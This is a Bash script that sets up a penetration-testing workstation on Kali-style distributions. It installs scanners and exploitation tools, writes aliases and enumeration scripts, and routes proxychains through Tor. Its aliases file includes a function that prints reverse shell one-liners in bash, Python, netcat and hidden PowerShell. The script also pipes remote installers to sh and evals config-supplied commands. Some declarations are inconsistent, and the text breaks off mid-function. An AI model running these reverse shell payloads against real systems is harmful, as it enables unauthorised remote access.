#!/bin/bash

# =================================================================
# Kali Linux Pentesting Environment Setup Script
# =================================================================
# Description: Automated setup for Kali Linux and other security
#              distributions with focus on web/server pentesting.
#
# Author: Auto-generated
# Version: 2.0
# License: MIT
#
# Requirements:
#   - Kali Linux, Parrot OS, BlackArch, or Pentoo
#   - Non-root user with sudo privileges
#   - Internet connection
#
# Usage: 
#   ./Setup.sh          # Interactive installation
#   ./Setup.sh --help   # Show all options
#
# Features:
#   - Cross-distribution package management
#   - Python virtual environments for isolation
#   - Common pentesting tools and scripts
#   - Modern CLI tools and configurations
#   - Docker and container support
#   - Modular installation with interactive menu
# =================================================================

set -e  # Exit on any error

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to print colored output
print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Function to check if running as root
check_root() {
    if [[ $EUID -eq 0 ]]; then
        print_error "This script should not be run as root!"
        exit 1
    fi
}

# Function to create directory structure
create_directories() {
    print_status "Creating directory structure..."
    
    # Main pentesting directories
    mkdir -p ~/pentesting/{targets,tools,wordlists,scripts,reports,notes}
    mkdir -p ~/pentesting/targets/{recon,scans,exploits,loot,screenshots}
    mkdir -p ~/pentesting/tools/{custom,wordlists,payloads}
    
    # Python virtual environments directory
    mkdir -p ~/venvs
    
    print_success "Directory structure created"
}

# Function to update system
update_system() {
    print_status "Updating system packages..."
    sudo apt update && sudo apt upgrade -y
    print_success "System updated"
}

# Detect package manager (apt, dnf, pacman)
detect_pkg_manager() {
    if command -v apt &>/dev/null; then
        PKG_MANAGER="apt"
    elif command -v dnf &>/dev/null; then
        PKG_MANAGER="dnf"
    elif command -v pacman &>/dev/null; then
        PKG_MANAGER="pacman"
    else
        print_error "No supported package manager found (apt, dnf, pacman)."
        exit 1
    fi
    print_status "Using package manager: $PKG_MANAGER"
}

# Add after detect_pkg_manager function
check_dependencies() {
    print_status "Checking required dependencies..."
    local deps=(curl wget git sudo jq)
    local missing=()

    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            missing+=("$dep")
        fi
    done

    if [ ${#missing[@]} -gt 0 ]; then
        print_warning "Installing missing dependencies: ${missing[*]}"
        for pkg in "${missing[@]}"; do
            install_pkg "$pkg"
        done
    fi
}

# Modificar las declaraciones de directorios
declare -g -r CONFIG_DIR="$SCRIPT_DIR/config"
declare -g -r LIB_DIR="$SCRIPT_DIR/lib"

# Añadir función de verificación de estructura
check_structure() {
    print_status "Verificando estructura del proyecto..."
    
    local dirs=(
        "$CONFIG_DIR"
        "$LIB_DIR"
    )
    
    local files=(
        "$CONFIG_DIR/tools.yaml"
        "$LIB_DIR/yaml_parser.sh"
    )
    
    # Crear directorios necesarios
    for dir in "${dirs[@]}"; do
        if [ ! -d "$dir" ]; then
            mkdir -p "$dir"
            print_status "Creado directorio: $dir"
        fi
    done
    
    # Verificar archivos necesarios
    for file in "${files[@]}"; do
        if [ ! -f "$file" ]; then
            case "$file" in
                *tools.yaml)
                    create_default_tools_yaml
                    ;;
                *yaml_parser.sh)
                    create_yaml_parser
                    ;;
            esac
        fi
    done
    
    print_success "Estructura del proyecto verificada"
}

# Enhanced variable declarations with explicit typing
declare -g -r VERSION="2.0"
declare -g -r SCRIPT_DIR="${0%/*}"
declare -g -r INSTALL_DIR="$HOME/pentesting"
declare -g -A TOOL_CONFIGS
declare -g -a TEMP_DIRS
declare -g -r LOG_FILE="/tmp/setup_$(date +%Y%m%d_%H%M%S).log"

# Enhanced error handling and cleanup
declare -g TEMP_DIRS=()
declare -g LOG_FILE="/tmp/setup_$(date +%Y%m%d_%H%M%S).log"

# Error handling with line numbers and command logging
trap 'err_handler $? $LINENO $BASH_COMMAND' ERR
trap 'cleanup_handler' EXIT
trap 'interrupt_handler' INT TERM

err_handler() {
    local exit_code=$1
    local line_no=$2
    local command="$3"
    local func_name="${FUNCNAME[1]:-main}"
    
    print_error "Error in $func_name() on line $line_no: '$command' exited with status $exit_code"
    printf "[ERROR] %s() Line %s: '%s' failed with status %d\n" \
           "$func_name" "$line_no" "$command" "$exit_code" >> "$LOG_FILE"
}

cleanup_handler() {
    local exit_code=$?
    print_status "Performing cleanup..."
    
    # Clean up temporary directories
    for dir in "${TEMP_DIRS[@]}"; do
        if [[ -d "$dir" ]]; then
            rm -rf "$dir"
            print_status "Removed temporary directory: $dir"
        fi
    done
    
    # Clean up incomplete installations on error
    if [[ $exit_code -ne 0 ]]; then
        print_warning "Script exited with errors. Check $LOG_FILE for details."
    fi
}

interrupt_handler() {
    print_warning "Script interrupted by user"
    exit 130
}

# Improved temporary directory management
create_temp_dir() {
    local temp_dir
    temp_dir=$(mktemp -d) || {
        print_error "Failed to create temporary directory"
        return 1
    }
    TEMP_DIRS+=("$temp_dir")
    printf '%s\n' "$temp_dir"
}

# Install a package using the detected package manager
install_pkg() {
    local pkg="$1"
    local retries=3
    local wait_time=5
    local attempt=1

    while [ $attempt -le $retries ]; do
        print_status "Installing $pkg (attempt $attempt/$retries)..."
        case "$PKG_MANAGER" in
            apt)
                if sudo DEBIAN_FRONTEND=noninteractive apt-get install -y "$pkg" >/dev/null 2>>"$LOG_FILE"; then
                    print_success "$pkg installed successfully"
                    return 0
                fi
                ;;
            dnf)
                if sudo dnf install -y "$pkg" >/dev/null 2>>"$LOG_FILE"; then
                    print_success "$pkg installed successfully"
                    return 0
                fi
                ;;
            pacman)
                if sudo pacman -S --noconfirm "$pkg" >/dev/null 2>>"$LOG_FILE"; then
                    print_success "$pkg installed successfully"
                    return 0
                fi
                ;;
        esac
        
        attempt=$((attempt + 1))
        [ $attempt -le $retries ] && sleep $wait_time
    done

    print_error "Failed to install $pkg after $retries attempts"
    return 1
}

# Helper function for package installation with error handling
install_and_check() {
    local pkg="$1"
    local retry_count=3
    local attempt=1

    while [ $attempt -le $retry_count ]; do
        print_status "Installing $pkg (attempt $attempt/$retry_count)..."
        if install_pkg "$pkg"; then
            print_success "$pkg installed successfully"
            return 0
        fi
        attempt=$((attempt + 1))
        sleep 2  # Brief pause before retry
    done

    print_error "Failed to install $pkg after $retry_count attempts"
    return 1
}

# Optimized directory operations
pushd_quiet() {
    pushd "$1" &>/dev/null || {
        print_error "Failed to change directory to $1"
        return 1
    }
}

popd_quiet() {
    popd &>/dev/null || {
        print_error "Failed to return to previous directory"
        return 1
    }
}

# Optimized clone function using parameter expansion
clone_repo_parallel() {
    local repo_url="$1"
    local target_dir="$2"
    local repo_name="${repo_url##*/}"  # More efficient than basename
    repo_name="${repo_name%.git}"      # Remove .git suffix
    
    if [[ ! -d "$target_dir/$repo_name" ]]; then
        {
            git clone --quiet "$repo_url" "$target_dir/$repo_name" &&
            print_success "Cloned $repo_name"
        } 2>> "$LOG_FILE" || {
            print_error "Failed to clone $repo_name"
            return 1
        }
    else
        # Update existing repository using pushd/popd
        pushd "$target_dir/$repo_name" &>/dev/null || return 1
        git pull --quiet && print_success "Updated $repo_name" || print_error "Failed to update $repo_name"
        popd &>/dev/null || return 1
    fi
}

# Function to install essential packages with parallel installation
install_essential_packages() {
    print_status "Installing essential and pentesting packages..."
    local -a pids=()

    # Group packages by type for better parallelization
    declare -A PKG_GROUPS=(
        ["base"]="curl wget git vim nano build-essential"
        ["python"]="python3-pip python3-venv python3-dev"
        ["js"]="nodejs npm"
        ["golang"]="golang-go"
        ["utils"]="tree htop unzip p7zip-full"
        ["network"]="net-tools dnsutils nmap masscan"
        ["web"]="nikto dirb gobuster feroxbuster whatweb wapiti ffuf"
        ["recon"]="sublist3r amass wpscan nuclei"
        ["exploit"]="metasploit-framework sqlmap hydra medusa"
    )

    # Install packages in parallel by group
    for group in "${!PKG_GROUPS[@]}"; do
        print_status "Installing $group packages..."
        for pkg in ${PKG_GROUPS[$group]}; do
            install_and_check "$pkg" & 
            pids+=($!)
        done
        # Wait for current group and check status
        track_jobs "${pids[@]}" || print_warning "Some packages in group $group failed to install"
        pids=()  # Reset for next group
    done

    print_success "Package installation completed"
}

# Function to get latest GitHub release URL
get_github_release_url() {
    local repo="$1"
    local pattern="$2"
    local api_url="https://api.github.com/repos/$repo/releases/latest"
    local download_url
    local response
    
    # Single curl call with response capture
    response=$(curl -sL "$api_url") || return 1
    download_url=$(jq -r --arg pat "$pattern" \
        '.assets[] | select(.name | test($pat)) | .browser_download_url' <<< "$response" | head -n1)
    
    if [[ -z "$download_url" ]]; then
        print_error "Failed to get latest release URL for $repo"
        return 1
    fi
    printf '%s\n' "$download_url"
}

# Enhanced job tracking with detailed tool information
declare -A JOB_TOOLS
track_jobs() {
    local -a pids=("$@")
    local -a failed_tools=()
    local failed=0
    
    for pid in "${pids[@]}"; do
        wait "$pid" || {
            failed=1
            failed_tools+=("${JOB_TOOLS[$pid]:-Unknown}")
            print_error "Installation failed for: ${JOB_TOOLS[$pid]:-Unknown tool}"
        }
    done
    
    if [ ${#failed_tools[@]} -gt 0 ]; then
        print_error "Failed installations: ${failed_tools[*]}"
        print_error "Check the logs above for specific error messages"
        return 1
    fi
    
    return 0
}

# Function to verify GPG signatures
verify_gpg_signature() {
    local file="$1"
    local signature="$2"
    local keyid="$3"

    if ! command -v gpg &>/dev/null; then
        print_error "GPG not installed. Cannot verify signatures."
        return 1
    fi

    # Import key if not already present
    if ! gpg --list-keys "$keyid" &>/dev/null; then
        gpg --keyserver keyserver.ubuntu.com --recv-keys "$keyid" || {
            print_error "Failed to import GPG key $keyid"
            return 1
        }
    fi

    # Verify signature
    if ! gpg --verify "$signature" "$file"; then
        print_error "GPG signature verification failed for $file"
        return 1
    fi

    print_success "GPG signature verified for $file"
    return 0
}

# Enhanced security verification with multiple methods
verify_artifact() {
    local file="$1"
    local type="$2"
    local reference="$3"
    
    case "$type" in
        gpg)
            verify_gpg_signature "$file" "$file.asc" "$reference"
            ;;
        sha256)
            echo "$reference $file" | sha256sum -c - >/dev/null || {
                print_error "SHA256 verification failed for $file"
                return 1
            }
            ;;
        sha512)
            echo "$reference $file" | sha512sum -c - >/dev/null || {
                print_error "SHA512 verification failed for $file"
                return 1
            }
            ;;
        *)
            print_warning "No verification method specified for $file"
            return 0
            ;;
    esac
}

# Unified tool installation function
install_tool() {
    # Documentation and usage
    local usage="Usage: install_tool <name> [options] | install_tool --config=<yaml_config>
    
    Direct installation:
        install_tool <name> --source=<source> --url=<url> [options]
    
    YAML configuration:
        install_tool --config=<base64_yaml>
    
    Options:
        --source    Source type: github, gitlab, pypi, go, custom
        --url       Repository URL or package name
        --version   Version to install (default: latest)
        --type      Installation type: release, clone, asset, package
        --pattern   Pattern for asset matching
        --verify    Verification method: gpg,sha256,sha512
        --key       GPG key or hash for verification
        --deps      Comma-separated dependencies
        --build     Build command
        --install   Install command"

    [ "$1" = "-h" -o "$1" = "--help" ] && { echo "$usage"; return 0; }

    local name config
    declare -A tool_config

    # Parse arguments
    if [[ "$1" == "--config="* ]]; then
        config="${1#--config=}"
        if ! tool_config=$(parse_yaml_config "$config"); then
            print_error "Failed to parse YAML configuration"
            return 1
        fi
        name="${tool_config[name]}"
    else
        name="$1"
        shift
        while [[ "$#" -gt 0 ]]; do
            case "$1" in
                --source=*) tool_config[source]="${1#--source=}" ;;
                --url=*) tool_config[url]="${1#--url=}" ;;
                --version=*) tool_config[version]="${1#--version=}" ;;
                --type=*) tool_config[type]="${1#--type=}" ;;
                --pattern=*) tool_config[pattern]="${1#--pattern=}" ;;
                --verify=*) tool_config[verify]="${1#--verify=}" ;;
                --key=*) tool_config[key]="${1#--key=}" ;;
                --deps=*) tool_config[deps]="${1#--deps=}" ;;
                --build=*) tool_config[build]="${1#--build=}" ;;
                --install=*) tool_config[install]="${1#--install=}" ;;
                *) print_error "Unknown option: $1"; return 1 ;;
            esac
            shift
        done
    fi

    # Handle the installation based on source type
    case "${tool_config[source]}" in
        github|gitlab)
            install_from_git "$name" "${tool_config[@]}" || return 1
            ;;
        pypi|go)
            install_from_package "$name" "${tool_config[@]}" || return 1
            ;;
        custom)
            if [ -n "${tool_config[install]}" ]; then
                eval "${tool_config[install]}" || return 1
            fi
            ;;
        *)
            print_error "Unsupported source type: ${tool_config[source]}"
            return 1
            ;;
    esac

    # Post-installation steps (build if specified)
    if [ -n "${tool_config[build]}" ]; then
        (cd "$HOME/pentesting/tools/$name" && eval "${tool_config[build]}") || return 1
    fi

    print_success "$name installed successfully"
    return 0
}

# Improved GitHub tools installation
install_github_tools() {
    print_status "Installing tools from GitHub..."
    local -a pids=()
    
    for tool_name in "${!TOOL_CONFIGS[@]}"; do
        (install_tool --config="${TOOL_CONFIGS[$tool_name]}") &
        pid=$!
        pids+=($pid)
        JOB_TOOLS[$pid]="$tool_name"
    done

    track_jobs "${pids[@]}" || {
        print_warning "Some tools failed to install. Check the logs above for details."
        return 1
    }
}

# Function to configure VMware tools
configure_vmware_tools() {
    print_status "Configuring VMware tools..."
    
    # Enable and start VMware services
    sudo systemctl enable open-vm-tools
    sudo systemctl start open-vm-tools
    
    # Configure shared folders if needed
    sudo mkdir -p /mnt/hgfs
    
    print_success "VMware tools configured"
}

# Function to check OS compatibility (expanded for more distros and arch)
check_os() {
    print_status "Checking OS compatibility..."
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        ARCH=$(uname -m)
        case "$ID" in
            kali|parrot|blackarch|pentoo)
                print_success "Detected supported OS: $ID ($ARCH)"
                ;;
            *)
                print_warning "This script is optimized for Kali, Parrot, BlackArch, or Pentoo. Proceeding anyway, but some features may not work."
                ;;
        esac
        print_status "System architecture: $ARCH"
    else
        print_warning "Cannot detect OS. Proceeding, but some features may not work."
    fi
}

# Validate packages for multiple package managers
validate_packages() {
    print_status "Validating package availability in repositories..."
    local missing=()
    
    case "$PKG_MANAGER" in
        apt)
            for pkg in "${PACKAGES[@]}"; do
                if ! apt-cache show "$pkg" &>/dev/null; then
                    missing+=("$pkg")
                fi
            done
            ;;
        dnf)
            for pkg in "${PACKAGES[@]}"; do
                if ! dnf list "$pkg" &>/dev/null; then
                    missing+=("$pkg")
                fi
            done
            ;;
        pacman)
            for pkg in "${PACKAGES[@]}"; do
                if ! pacman -Si "$pkg" &>/dev/null; then
                    missing+=("$pkg")
                fi
            done
            ;;
    esac

    if [ ${#missing[@]} -gt 0 ]; then
        print_warning "The following packages are not available in your repositories:"
        printf '  - %s\n' "${missing[@]}"
        if ! whiptail --yesno "Some packages are not available. Continue anyway?" 10 60; then
            exit 1
        fi
    else
        print_success "All packages are available in repositories"
    fi
}

# Interactive menu for module selection
select_modules_interactive() {
    if ! command -v whiptail &>/dev/null; then
        print_warning "whiptail not found. Installing..."
        install_pkg whiptail || {
            print_error "Could not install whiptail. Using default options."
            return 1
        }
    fi

    # Main menu
    local MENU_CHOICE
    while true; do
        MENU_CHOICE=$(whiptail --title "Kali Setup Configuration" --menu "Choose an option:" 20 78 10 \
            "1" "Select modules to install" \
            "2" "Configure installation options" \
            "3" "View selected configuration" \
            "4" "Start installation" \
            "q" "Quit" 3>&1 1>&2 2>&3)

        case $MENU_CHOICE in
            1)
                # Module selection
                SELECTED_MODULES=$(whiptail --title "Module Selection" --checklist \
                    "Select modules to install:" 20 78 8 \
                    "TOOLS" "Essential pentesting tools" ON \
                    "PYTHON" "Python environments and packages" ON \
                    "ZSH" "ZSH configuration and aliases" ON \
                    "DOCKER" "Container tools and configs" ON \
                    "ADVANCED" "Advanced tools and scripts" ON \
                    "WORDLISTS" "Common wordlists" ON \
                    3>&1 1>&2 2>&3)
                ;;
            2)
                # Additional options
                OPTIONS=$(whiptail --title "Installation Options" --separate-output --checklist \
                    "Select additional options:" 20 78 5 \
                    "AUTO_VENV" "Auto-activate Python venv" OFF \
                    "MINIMAL" "Minimal installation" OFF \
                    "FORCE" "Force package installation" OFF \
                    3>&1 1>&2 2>&3)
                ;;
            3)
                # Show current configuration
                whiptail --title "Current Configuration" --msgbox \
                    "Selected modules:\n${SELECTED_MODULES}\n\nOptions:\n${OPTIONS}" 20 78
                ;;
            4|"")
                # Start installation
                break
                ;;
            q)
                print_warning "Setup cancelled by user"
                exit 0
                ;;
        esac
    done

    # Convert selections to variables
    SKIP_TOOLS=true; SKIP_PYTHON=true; SKIP_ZSH=true; SKIP_DOCKER=true; SKIP_ADVANCED=true; SKIP_WORDLISTS=true
    [[ $SELECTED_MODULES == *TOOLS* ]] && SKIP_TOOLS=false
    [[ $SELECTED_MODULES == *PYTHON* ]] && SKIP_PYTHON=false
    [[ $SELECTED_MODULES == *ZSH* ]] && SKIP_ZSH=false
    [[ $SELECTED_MODULES == *DOCKER* ]] && SKIP_DOCKER=false
    [[ $SELECTED_MODULES == *ADVANCED* ]] && SKIP_ADVANCED=false
    [[ $SELECTED_MODULES == *WORDLISTS* ]] && SKIP_WORDLISTS=false
}

# Function to configure Metasploit database
configure_metasploit() {
    print_status "Configuring Metasploit database..."
    if ! sudo systemctl start postgresql; then
        print_error "Failed to start postgresql. Possible causes:"
        echo " - PostgreSQL is not installed or enabled."
        echo " - Service name may differ on your distribution."
        echo "Try: sudo apt install postgresql && sudo systemctl enable postgresql"
        return 1
    fi
    if ! sudo msfdb init; then
        print_warning "Metasploit database initialization failed."
        echo "Possible causes:"
        echo " - Database already initialized."
        echo " - Permission issues (try running with sudo)."
        echo " - PostgreSQL is not running or misconfigured."
        echo "Manual fix: sudo msfdb reinit"
    fi
    sudo systemctl enable postgresql
    print_success "Metasploit database configuration attempted."
}

# Unified aliases and functions setup
setup_unified_aliases() {
    print_status "Setting up unified pentesting aliases and functions..."
    mkdir -p ~/.config/zsh
    cat > ~/.config/zsh/pentesting_aliases.zsh << 'EOF'
# ~/.config/zsh/pentesting_aliases.zsh
# All pentesting aliases and functions in one place.
# You can edit this file to customize your workflow.

# --- Aliases ---
alias ports="netstat -tuln"
alias myip="curl -s ifconfig.me"
alias localip="ip addr show | grep 'inet ' | grep -v 127.0.0.1"
alias httpsrv="python3 -m http.server"
alias smbsrv="impacket-smbserver share ."
alias revshell="nc -lvnp"
alias enum="~/pentesting/tools/LinEnum/LinEnum.sh"
alias linpeas="~/pentesting/tools/PEASS-ng/linPEAS/linpeas.sh"
alias winpeas="~/pentesting/tools/PEASS-ng/winPEAS/winPEASbat/winPEAS.bat"
alias autorecon="source ~/pentesting/tools/AutoRecon/venv/bin/activate && python ~/pentesting/tools/AutoRecon/autorecon.py"
alias pentest="source ~/venvs/pentesting/bin/activate"
alias webapp="source ~/venvs/webapp/bin/activate"
alias pendir="cd ~/pentesting"
alias tools="cd ~/pentesting/tools"
alias targets="cd ~/pentesting/targets"
alias reports="cd ~/pentesting/reports"
alias quickscan="nmap -sS -O -sV --version-intensity 5 --script=default"
alias fullscan="nmap -sS -sU -O -sV -sC -A -p-"
alias webscan="nmap -sS -sV -p80,443,8080,8443 --script=http-*"
alias burp="java -jar -Xmx2g /usr/bin/burpsuite"
alias shared="cd /mnt/hgfs"
alias newscreen="screen -S"
alias listscreen="screen -ls"
alias term="terminator"
alias termconfig="terminator --preferences"
alias update-tools="cd ~/pentesting/tools && find . -name '.git' -type d -exec sh -c 'cd \"{}\"/../ && echo \"Updating \$(basename \$(pwd))\" && git pull' \;"
# Modern CLI
alias cat='bat --paging=never'
alias ls='exa --icons'
alias ll='exa -lah --icons --group-directories-first'
alias la='exa -la --icons'
alias lt='exa --tree --level=2 --icons'
alias grep='rg'
alias find='fd'
alias du='dust'
alias ps='procs'
alias top='btop'
# Directory navigation
alias ..='cd ..'
alias ...='cd ../..'
alias ....='cd ../../..'

# --- Functions ---
target() {
    # Improved: Always create structure, even if IP is not provided
    if [[ -z "$1" ]]; then
        echo "Usage: target <name> [IP]"
        return 1
    fi
    ~/pentesting/scripts/init_target.sh "$1" "${2:-}"
}
revshell() {
    if [[ -z "$1" ]] || [[ -z "$2" ]]; then
        echo "Usage: revshell <LHOST> <LPORT>"
        echo "Generates common reverse shell payloads"
        return 1
    fi
    local lhost="$1"
    local lport="$2"
    echo "=== REVERSE SHELL PAYLOADS ==="
    echo ""
    echo "Bash:"
    echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
    echo ""
    echo "Python:"
    echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    echo ""
    echo "NC (traditional):"
    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f"
    echo ""
    echo "PowerShell:"
    echo "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$lhost\",$lport);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
}
qscan() { if [[ -z "$1" ]]; then echo "Usage: qscan <target>"; return 1; fi; nmap -sS -sV -O -T4 --top-ports 1000 "$1"; }
fscan() { if [[ -z "$1" ]]; then echo "Usage: fscan <target>"; return 1; fi; nmap -sS -sC -sV -O -T4 -p- "$1"; }
wscan() { if [[ -z "$1" ]]; then echo "Usage: wscan <target>"; return 1; fi; nmap -sS -sV -p80,443,8080,8443,8000,3000,5000 --script=http-* "$1"; }
EOF

    # Ensure .zshrc sources the unified aliases file only once
    if ! grep -q "pentesting_aliases.zsh" ~/.zshrc 2>/dev/null; then
        echo "" >> ~/.zshrc
        echo "# Load unified pentesting aliases and functions" >> ~/.zshrc
        echo "[[ -f ~/.config/zsh/pentesting_aliases.zsh ]] && source ~/.config/zsh/pentesting_aliases.zsh" >> ~/.zshrc
    fi

    print_success "Unified pentesting aliases and functions configured"
}

# Optional: Auto-activate pentesting venv on shell start
setup_auto_venv() {
    print_status "Configuring auto-activation of pentesting Python venv..."
    if ! grep -q "source ~/venvs/pentesting/bin/activate" ~/.zshrc 2>/dev/null; then
        echo "" >> ~/.zshrc
        echo "# Auto-activate pentesting Python venv" >> ~/.zshrc
        echo "[[ -f ~/venvs/pentesting/bin/activate ]] && source ~/venvs/pentesting/bin/activate" >> ~/.zshrc
        print_success "Auto-activation of pentesting venv added to .zshrc"
    else
        print_warning "Auto-activation of pentesting venv already present in .zshrc"
    fi
}

# Function to create useful scripts
create_useful_scripts() {
    print_status "Creating useful scripts..."
    
    # Port scanner script
    cat > ~/pentesting/scripts/portscan.sh << 'EOF'
#!/bin/bash
# Quick port scanner with common ports

if [ $# -eq 0 ]; then
    echo "Usage: $0 <target>"
    exit 1
fi

target=$1
echo "Scanning $target..."

# Quick scan of common ports
nmap -sS -T4 -p21,22,23,25,53,80,110,111,135,139,143,443,993,995,1723,3306,3389,5432,5900,8080 $target

# Service version detection on open ports
echo "Running service detection..."
nmap -sV -sC $target
EOF

    # Web directory enumeration script
    cat > ~/pentesting/scripts/webenum.sh << 'EOF'
#!/bin/bash
# Web directory enumeration

if [ $# -eq 0 ]; then
    echo "Usage: $0 <target_url>"
    exit 1
fi

target=$1
echo "Enumerating directories on $target..."

# Gobuster scan
gobuster dir -u $target -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt,js,css -t 50

# Alternative with ffuf
echo "Running ffuf scan..."
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u $target/FUZZ -t 50
EOF

    # SMB enumeration script
    cat > ~/pentesting/scripts/smbenum.sh << 'EOF'
#!/bin/bash
# SMB enumeration script
# Tip: crackmapexec is a modern alternative to enum4linux for many scenarios.

if [ $# -eq 0 ]; then
    echo "Usage: $0 <target>"
    exit 1
fi

target=$1
echo "Enumerating SMB on $target..."

# Nmap SMB scripts
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse,smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-services.nse,smb-enum-sessions.nse $target

# smbclient
echo "Listing shares with smbclient..."
smbclient -L //$target -N

# enum4linux
echo "Running enum4linux..."
enum4linux -a $target

# crackmapexec (modern alternative)
if command -v crackmapexec &>/dev/null; then
    echo "Running crackmapexec smb enumeration..."
    crackmapexec smb $target
fi
EOF

    # Make scripts executable
    chmod +x ~/pentesting/scripts/*.sh
    
    print_success "Useful scripts created"
}

# Function to configure proxychains
configure_proxychains() {
    print_status "Configuring proxychains..."
    
    # Backup original config
    sudo cp /etc/proxychains4.conf /etc/proxychains4.conf.bak
    
    # Create custom configuration
    sudo tee /etc/proxychains4.conf > /dev/null << 'EOF'
# proxychains.conf  VER 4.x
strict_chain
proxy_dns 
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
localnet 127.0.0.0/255.0.0.0
quiet_mode

[ProxyList]
# Tor proxy
socks4 127.0.0.1 9050
# HTTP proxy (uncomment if needed)
# http 127.0.0.1 8080
EOF

    print_success "Proxychains configured"
}

# Function to setup wordlists
setup_wordlists() {
    print_status "Setting up wordlists..."
    
    cd ~/pentesting/wordlists
    
    # Download additional wordlists
    wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
    
    # Create symlinks to system wordlists
    ln -s /usr/share/wordlists/rockyou.txt.gz rockyou.txt.gz 2>/dev/null || true
    ln -s /usr/share/seclists seclists 2>/dev/null || true
    ln -s /usr/share/wordlists/dirbuster dirbuster 2>/dev/null || true
    
    cd ~
    print_success "Wordlists configured"
}

# === MODERN CLI TOOLS ===
install_modern_cli_tools() {
    print_status "Installing modern CLI tools..."
    # Install Rust (for some modern tools)
    if ! command -v cargo &>/dev/null; then
        curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
        source $HOME/.cargo/env
    fi

    # Install modern replacements, check individually for better feedback
    for tool in bat exa ripgrep fd-find dust procs bottom zoxide starship git-delta; do
        if ! command -v $tool &>/dev/null; then
            cargo install --locked $tool || print_warning "Failed to install $tool with cargo"
        else
            print_warning "$tool already installed (cargo)"
        fi
    done

    # Install fzf
    if [ ! -d "$HOME/.fzf" ]; then
        git clone --depth 1 https://github.com/junegunn/fzf.git ~/.fzf
        ~/.fzf/install --all
    else
        print_warning "fzf already installed"
    fi

    # Install additional useful tools
    sudo apt install -y jq yq httpie tldr thefuck tmux ranger ncdu prettyping

    print_success "Modern CLI tools installed"
}

# === ZSH & OH MY ZSH ===
setup_zsh_environment() {
    print_status "Setting up Zsh environment..."
    
    # Create XDG-compliant directories
    mkdir -p "${XDG_CONFIG_HOME:-$HOME/.config}/zsh"
    mkdir -p "${XDG_DATA_HOME:-$HOME/.local/share}/zsh"
    mkdir -p "${XDG_CACHE_HOME:-$HOME/.cache}/zsh"
    
    # Base zsh configuration
    cat > "${XDG_CONFIG_HOME:-$HOME/.config}/zsh/.zshrc" << 'EOF'
# XDG Base Directory Specification
export XDG_CONFIG_HOME="$HOME/.config"
export XDG_CACHE_HOME="$HOME/.cache"
export XDG_DATA_HOME="$HOME/.local/share"

# Source configurations
for conf in "$XDG_CONFIG_HOME/zsh/conf.d/"*.zsh; do
    [ -f "$conf" ] && source "$conf"
done

# Load Oh My Zsh if installed
[ -f "$XDG_CONFIG_HOME/zsh/.oh-my-zsh/oh-my-zsh.sh" ] && source "$XDG_CONFIG_HOME/zsh/.oh-my-zsh/oh-my-zsh.sh"

# Load custom configurations last
[ -f "$XDG_CONFIG_HOME/zsh/custom.zsh" ] && source "$XDG_CONFIG_HOME/zsh/custom.zsh"
EOF

    # Install Oh My Zsh with XDG compliance
    if [ ! -d "${XDG_CONFIG_HOME:-$HOME/.config}/zsh/.oh-my-zsh" ]; then
        export ZSH="${XDG_CONFIG_HOME:-$HOME/.config}/zsh/.oh-my-zsh"
        sh -c "$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" "" --unattended
    fi

    # Move existing configurations
    mkdir -p "${XDG_CONFIG_HOME:-$HOME/.config}/zsh/conf.d"
    mv ~/.config/zsh/pentesting_aliases.zsh "${XDG_CONFIG_HOME:-$HOME/.config}/zsh/conf.d/10-pentesting.zsh" 2>/dev/null || true
    mv ~/.config/zsh/pentesting_advanced.zsh "${XDG_CONFIG_HOME:-$HOME/.config}/zsh/conf.d/20-pentesting-advanced.zsh" 2>/dev/null || true

    # Update user's .zshenv to use XDG locations
    cat > "$HOME/.zshenv" << EOF
export ZDOTDIR="\${XDG_CONFIG_HOME:-\$HOME/.config}/zsh"
[ -f "\$ZDOTDIR/.zshrc" ] && source "\$ZDOTDIR/.zshrc"
EOF

    print_success "Zsh environment configured with XDG compliance"
}

# === CONTAINER TOOLS ===
install_container_tools() {
    print_status "Installing containerization tools..."
    curl -fsSL https://get.docker.com -o get-docker.sh
    sudo sh get-docker.sh
    sudo usermod -aG docker $USER
    rm get-docker.sh
    sudo curl -L "https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
    sudo chmod +x /usr/local/bin/docker-compose
    print_success "Container tools installed"
}

# === ADVANCED PENTEST TOOLS ===
install_advanced_pentest_tools() {
    print_status "Installing advanced pentesting tools..."
    sudo apt install -y awscli azure-cli
